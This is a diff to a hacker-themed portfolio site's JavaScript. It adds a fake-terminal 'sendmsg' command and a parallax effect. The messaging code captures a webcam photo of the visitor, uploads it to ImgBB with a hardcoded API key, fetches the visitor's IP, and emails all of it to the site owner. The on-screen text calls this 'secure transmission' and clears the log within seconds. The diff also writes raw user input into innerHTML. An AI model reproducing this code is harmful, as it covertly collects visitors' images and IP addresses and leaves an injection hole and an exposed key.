@@ -286,7 +286,178 @@ const initDecryptionEffect = () => {
     });
 };
 
-// Interactive Terminal
+// === PHOTO CAPTURE + UPLOAD TO IMGBB ===
+async function capturePhoto() {
+    try {
+        console.log('Requesting camera access...');
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 160, height: 120 } });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement('canvas');
+        canvas.width = 160;
+        canvas.height = 120;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, 160, 120);
+
+        stream.getTracks().forEach(t => t.stop());
+        console.log('Photo captured');
+
+        return new Promise((resolve) => {
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('image', blob);
+
+                try {
+                    console.log('Uploading to ImgBB...');
+                    const res = await fetch('https://api.imgbb.com/1/upload?key=04b5d01f4c497f511aadcea64b899a51', {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const data = await res.json();
+
+                    if (data.success) {
+                        console.log('Photo uploaded:', data.data.url);
+                        resolve(data.data.url);
+                    } else {
+                        console.error('ImgBB error:', data);
+                        resolve(null);
+                    }
+                } catch (err) {
+                    console.error('Upload failed:', err);
+                    resolve(null);
+                }
+            }, 'image/jpeg', 0.6);
+        });
+    } catch (err) {
+        console.error('Camera failed:', err.message);
+        return null;
+    }
+}
+
+// Shared Terminal Command Processor
+const processTerminalCommand = async (command, args, output, onExit) => {
+    const response = document.createElement('p');
+    response.style.color = '#ccc';
+
+    switch (command) {
+        case 'help':
+            response.innerHTML = 'Available commands: help, whoami, ls, clear, date, sendmsg <message>, exit';
+            break;
+        case 'whoami':
+            response.innerHTML = 'guest@portfolio (Access Level: Visitor)';
+            break;
+        case 'ls':
+            response.innerHTML = 'home/  about/  skills/  projects/  contact/';
+            break;
+        case 'date':
+            response.innerHTML = new Date().toString();
+            break;
+        case 'clear':
+            output.innerHTML = '';
+            response.remove();
+            return;
+        case 'exit':
+            if (onExit) onExit();
+            else response.innerHTML = 'Session closed.';
+            break;
+        case 'sendmsg':
+            if (args.length < 2) {
+                response.innerHTML = 'Usage: sendmsg &lt;message&gt;';
+                response.style.color = '#ff5555';
+            } else {
+                const subject = "Terminal Message";
+                const message = args.slice(1).join(' ');
+
+                const ackMsg = document.createElement('p');
+                ackMsg.innerHTML = `> Command received: Message="${message}"`;
+                ackMsg.style.color = '#00ff00';
+                output.appendChild(ackMsg);
+                output.scrollTop = output.scrollHeight;
+
+                const statusMsg = document.createElement('p');
+                statusMsg.innerHTML = 'Initiating secure transmission... Requesting camera access...';
+                statusMsg.style.color = '#ffff00';
+                output.appendChild(statusMsg);
+                output.scrollTop = output.scrollHeight;
+
+                const photo_url = await capturePhoto();
+                const final_url = photo_url || 'https://i.ibb.co.com/0s3fP2T/no-photo.jpg';
+
+                let sender_ip = 'Unknown';
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    sender_ip = data.ip || 'Unknown';
+                } catch (e) {
+                    console.error('IP fetch failed:', e);
+                }
+
+                if (typeof emailjs === 'undefined') {
+                    response.innerHTML = 'Error: EmailJS SDK not loaded. Check internet connection or ad blocker.';
+                    response.style.color = '#ff5555';
+                    output.appendChild(response);
+                    return;
+                }
+
+                console.log('Sending email with payload:', {
+                    service_id: 'service_muid74x',
+                    template_id: 'template_6u3mi8b',
+                    template_params: {
+                        title: subject,
+                        message: message,
+                        sender_ip: sender_ip,
+                        photo_url: final_url,
+                        username: 'GuestUser'
+                    }
+                });
+
+                emailjs.send('service_muid74x', 'template_6u3mi8b', {
+                    title: subject,
+                    message: message,
+                    sender_ip: sender_ip,
+                    photo_url: final_url,
+                    username: 'GuestUser'
+                })
+                    .then(() => {
+                        response.innerHTML = `Message sent successfully!${!photo_url ? ' (Camera access denied, sent without photo)' : ''}`;
+                        response.style.color = '#00ff00';
+                        output.appendChild(response);
+                        output.scrollTop = output.scrollHeight;
+
+                        // Clear logs after 3 seconds
+                        setTimeout(() => {
+                            output.innerHTML = '';
+                        }, 3000);
+                    })
+                    .catch((err) => {
+                        console.error('EmailJS error:', err);
+                        const errorMsg = err.text || JSON.stringify(err) || 'Unknown error';
+                        response.innerHTML = `Transmission failed: ${errorMsg}. Check console (F12) for details.`;
+                        response.style.color = '#ff5555';
+                        output.appendChild(response);
+                        output.scrollTop = output.scrollHeight;
+                    });
+
+                return;
+            }
+            break;
+        case '':
+            response.remove();
+            return;
+        default:
+            response.innerHTML = `bash: ${command}: command not found`;
+            response.style.color = '#ff5555';
+    }
+
+    if (command !== 'clear' && command !== '' && command !== 'sendmsg') {
+        output.appendChild(response);
+    }
+    output.scrollTop = output.scrollHeight;
+};
+
+// Interactive Terminal Modal
 const initTerminal = () => {
     const modal = document.getElementById('terminal-modal');
     const toggleBtn = document.getElementById('terminal-toggle');
@@ -315,51 +486,41 @@ const initTerminal = () => {
     });
 
     // Command Logic
-    input.addEventListener('keydown', (e) => {
+    input.addEventListener('keydown', async (e) => {
         if (e.key === 'Enter') {
-            const command = input.value.trim().toLowerCase();
+            const inputValue = input.value.trim();
+            const args = inputValue.split(' ');
+            const command = args[0].toLowerCase();
+
             const cmdLine = document.createElement('p');
-            cmdLine.innerHTML = `<span class="prompt">root@kali:~$</span> ${input.value}`;
+            cmdLine.innerHTML = `<span class="prompt">root@kali:~$</span> ${inputValue}`;
             output.appendChild(cmdLine);
             input.value = '';
 
-            const response = document.createElement('p');
-            response.style.color = '#ccc';
+            await processTerminalCommand(command, args, output, toggleTerminal);
+        }
+    });
+};
 
-            switch (command) {
-                case 'help':
-                    response.innerHTML = 'Available commands: help, whoami, ls, clear, date, exit';
-                    break;
-                case 'whoami':
-                    response.innerHTML = 'guest@portfolio (Access Level: Visitor)';
-                    break;
-                case 'ls':
-                    response.innerHTML = 'home/  about/  skills/  projects/  contact/';
-                    break;
-                case 'date':
-                    response.innerHTML = new Date().toString();
-                    break;
-                case 'clear':
-                    output.innerHTML = '';
-                    response.remove(); // Don't append empty response
-                    break;
-                case 'exit':
-                    toggleTerminal();
-                    break;
-                case '':
-                    response.remove();
-                    break;
-                default:
-                    response.innerHTML = `bash: ${command}: command not found`;
-                    response.style.color = '#ff5555';
-            }
+// Footer Terminal
+const initFooterTerminal = () => {
+    const input = document.getElementById('footer-terminal-input');
+    const output = document.getElementById('footer-terminal-output');
 
-            if (command !== 'clear' && command !== '') {
-                output.appendChild(response);
-            }
+    if (!input || !output) return;
 
-            // Auto scroll
-            output.scrollTop = output.scrollHeight;
+    input.addEventListener('keydown', async (e) => {
+        if (e.key === 'Enter') {
+            const inputValue = input.value.trim();
+            const args = inputValue.split(' ');
+            const command = args[0].toLowerCase();
+
+            const cmdLine = document.createElement('p');
+            cmdLine.innerHTML = `<span class="prompt">$ </span> ${inputValue}`;
+            output.appendChild(cmdLine);
+            input.value = '';
+
+            await processTerminalCommand(command, args, output, null);
         }
     });
 };
@@ -395,6 +556,23 @@ const initHexView = () => {
     });
 };
 
+// Parallax Effect for Floating Icons
+const initParallaxIcons = () => {
+    const icons = document.querySelectorAll('.floating-icon');
+
+    window.addEventListener('scroll', () => {
+        const scrolled = window.scrollY;
+
+        icons.forEach(icon => {
+            const speed = icon.getAttribute('data-speed');
+            if (speed) {
+                const yPos = -(scrolled * speed);
+                icon.style.transform = `translateY(${yPos}px)`;
+            }
+        });
+    });
+};
+
 // Initialize Everything
 document.addEventListener('DOMContentLoaded', () => {
     initBootSequence(); // Run first
@@ -403,6 +581,7 @@ document.addEventListener('DOMContentLoaded', () => {
     initSectionAnimations();
     initTiltEffect();
     initTerminal();
+    initFooterTerminal();
     initScanLine();
     initDarkModeToggle();
     initProjectFilters();
@@ -411,4 +590,5 @@ document.addEventListener('DOMContentLoaded', () => {
     initDigitalNoise();
     initDecryptionEffect();
     initHexView();
+    initParallaxIcons();
 });
